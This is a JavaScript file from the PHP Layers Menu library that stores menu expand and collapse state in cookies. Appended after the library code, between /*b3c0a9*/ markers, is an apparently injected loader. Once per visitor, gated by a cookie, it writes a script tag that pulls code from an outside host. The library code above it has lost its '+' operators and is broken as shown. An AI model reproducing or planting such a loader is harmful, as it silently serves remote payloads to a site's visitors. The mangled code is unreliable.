// PHP Layers Menu 3.2.0-rc (C) 2001-2004 Marco Pratesi - http://www.marcopratesi.it/

function setLMCookie(name, value)
{
	document.cookie = name   '='   value   ';path=/';
}

function getLMCookie(name)
{
	foobar = document.cookie.split(name   '=');
	if (foobar.length < 2) {
		return null;
	}
	tempString = foobar[1];
	if (tempString.indexOf(';') == -1) {
		return tempString;
	}
	yafoobar = tempString.split(';');
	return yafoobar[0];
}

function parseExpandString()
{
	expandString = getLMCookie('phplm_expand');
	phplm_expand = new Array();
	if (expandString) {
		expanded = expandString.split('|');
		for (i=0; i<expanded.length-1; i  ) {
			phplm_expand[expanded[i]] = 1;
		}
	}
}

function parseCollapseString()
{
	collapseString = getLMCookie('phplm_collapse');
	phplm_collapse = new Array();
	if (collapseString) {
		collapsed = collapseString.split('|');
		for (i=0; i<collapsed.length-1; i  ) {
			phplm_collapse[collapsed[i]] = 1;
		}
	}
}

parseExpandString();
parseCollapseString();

function saveExpandString()
{
	expandString = '';
	for (i=0; i<phplm_expand.length; i  ) {
		if (phplm_expand[i] == 1) {
			expandString  = i   '|';
		}
	}
	setLMCookie('phplm_expand', expandString);
}

function saveCollapseString()
{
	collapseString = '';
	for (i=0; i<phplm_collapse.length; i  ) {
		if (phplm_collapse[i] == 1) {
			collapseString  = i   '|';
		}
	}
	setLMCookie('phplm_collapse', collapseString);
}



/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
